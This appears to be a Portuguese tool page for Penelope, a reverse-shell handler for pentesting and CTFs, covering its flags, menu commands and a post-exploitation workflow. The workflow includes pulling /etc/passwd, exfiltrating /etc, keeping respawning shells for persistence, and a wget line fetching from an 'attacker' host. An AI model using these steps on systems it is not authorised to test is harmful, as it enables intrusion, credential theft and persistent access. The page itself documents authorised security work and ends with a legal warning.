Penelope

Shell handler moderno — substitui o Netcat com PTY automático, multi-sessões e transferência de ficheiros

🔗 GitHub 📖 Documentação 📦 Releases

O que é o Penelope?

O Penelope é um shell handler moderno, desenhado para pentesters e jogadores de CTF como alternativa ao Netcat básico. O seu objetivo é simplificar, acelerar e otimizar os workflows de pós-exploração após obter execução remota de código (RCE) . É escrito inteiramente em Python e usa apenas a biblioteca padrão — sem dependências externas .

Foi adicionado ao Kali Linux na versão 2026.2 e está disponível via sudo apt install penelope. Ganhou destaque pela praticidade no pós-exploração: em segundos, transforma uma shell reversa básica numa sessão PTY totalmente interativa, com logging, transferências e gestão multi-sessão .

Funcionalidades Principais

O Penelope resolve os problemas mais frustrantes de trabalhar com shells reversas capturadas por Netcat :

FuncionalidadeDescrição
Auto-upgrade para PTY Converte shells básicas em PTY totalmente interativas, com redimensionamento em tempo real. Ctrl+C, su, sudo, vim e nano funcionam corretamente .
Multi-sessões Controla vários alvos em simultâneo, cada um com o seu próprio contexto e logging .
Session logging Registo automático de todas as interações com o alvo, com timestamps .
Transferência de ficheiros Upload e download de ficheiros e pastas entre atacante e alvo, incluindo URLs .
Módulos auxiliares Execução de scripts em memória, enumeração e priv-esc .
Port forwarding Encaminhamento de portas locais através da sessão .
HTTP file server Serve ficheiros via HTTP para o alvo fazer download .

Flags Essenciais

A sintaxe do Penelope é minimalista. Estas são as flags mais usadas :

FlagDescrição
-p PORTSPortas a escutar (padrão: 4444)
-i INTERFACEInterface/IP local (padrão: 0.0.0.0)
-c HOSTLigar a bind shell no host
-aMostrar payloads de reverse shell
-s FILE/DIRServir ficheiro ou pasta via HTTP
-LDesativar ficheiros de log
-UDesativar upgrade automático de shell
-m NManter N sessões ativas por alvo

Exemplos de Uso — do Listen à Pós-Exploração

1. Instalação

Setup
sudo apt install penelope

Kali Linux 2026.2+. Também disponível via Git clone ou pip .

2. Listen básico na porta 4444

Listen
penelope

Escuta em 0.0.0.0:4444. Qualquer reverse shell que chegue é capturada .

3. Listen em porta específica

Listen
penelope -p 5555

Escuta na porta 5555. Múltiplas portas: -p 4444,5555,6666 .

4. Mostrar payloads de reverse shell

Listen
penelope -a

Mostra payloads prontos (Bash, Netcat, Python, Perl, PHP, PowerShell) baseados nos listeners ativos. Os payloads são base64 encoded para sobreviver a mangling .

5. Listen em interface específica

Listen
penelope -i eth0 -p 5555

Escuta apenas na interface eth0. Útil em máquinas com múltiplas interfaces .

6. Ligar a bind shell

Listen
penelope -c 192.168.1.10 -p 3333

Liga a um bind shell em 192.168.1.10:3333 .

7. Reverse shell via SSH

Truque
penelope ssh user@target

Obtém uma reverse shell do alvo na porta local 4444. Útil quando tens credenciais SSH mas queres uma shell gerida pelo Penelope .

8. Servir ficheiro via HTTP

Ficheiros
penelope -s file.txt

Serve file.txt em 0.0.0.0:8000. O alvo pode fazer wget http://attacker:8000/file.txt .

9. Servir pasta completa

Ficheiros
penelope -s /path/to/tools

Serve toda a pasta. Útil para partilhar scripts de enumeração, exploits e ferramentas .

10. Modo upload HTTP

Ficheiros
penelope -s -u -ud /tmp/loot

Aceita PUT/POST e guarda ficheiros em /tmp/loot. Útil para receber dados exfiltrados sem precisar de shell .

Menu Principal — Comandos Essenciais

Depois de capturar uma shell, prime F12 para voltar ao menu principal. O menu suporta TAB completion e comandos curtos (i 1 em vez de interact 1) :

ComandoFunção
sessionsLista todas as sessões ativas
interact 1Interage com a sessão 1
spawn 1234Cria um novo listener e gera shell adicional do mesmo alvo
maintain 2Mantém 2 shells ativas por alvo, respawning quando morrem
upgradeForça upgrade da shell para PTY
upload file.txtEnvia ficheiro para o alvo
download /etc/passwdDescarrega ficheiro do alvo
script linpeas.shExecuta script em memória e guarda output localmente
portfwd 127.0.0.1:8080 -> 127.0.0.1:8080Encaminha porta local para serviço no alvo
historyHistórico de comandos do menu (audit trail)

Workflow Típico — Pós-Exploração em Segundos

Um fluxo de trabalho completo com Penelope :

PassoAção
1penelope -a — inicia listener e mostra payloads
2Executa payload no alvo (ex: Bash TCP ou Netcat)
3Shell chega automaticamente como PTY totalmente interativa
4Prime F12 para ir ao menu principal
5run recon — upload de scripts de enumeração
6interact 1 — executa scripts e analisa output
7download /etc — exfiltra dados relevantes
8spawn — cria shell de backup para persistência

penelope -a Listen + mostrar payloads
penelope -p 5555 Porta específica

interact 1 Voltar à sessão 1
upload file.txt Enviar para alvo
download /etc/passwd Trazer do alvo
maintain 2 Manter 2 shells vivas
💡 Dica: O Penelope resolve o problema clássico de shells reversas capturadas com Netcat: falta de TTY, comandos que quebram (su, sudo, editores), e perda de sessão sem aviso. Com maintain, se uma shell morrer, é automaticamente substituída. Com script, podes executar LinPEAS ou linux-smart-enumeration em memória, sem tocar o disco do alvo, e ver o output em tempo real num ficheiro local . Para CTFs, é praticamente obrigatório.
⚠️ Aviso legal: O Penelope serve para gerir shells obtidas durante exploração de RCE. Usá-lo para manter acesso, exfiltrar dados ou escalar privilégios em sistemas que não possuis ou para os quais não tens autorização explícita por escrito é ilegal. A funcionalidade maintain e o respawning automático de shells podem ser interpretados como estabelecimento de persistência — um agravante em contexto legal. Usa apenas em sistemas próprios, laboratórios isolados ou engajamentos com scope escrito e regras de engagement claras.
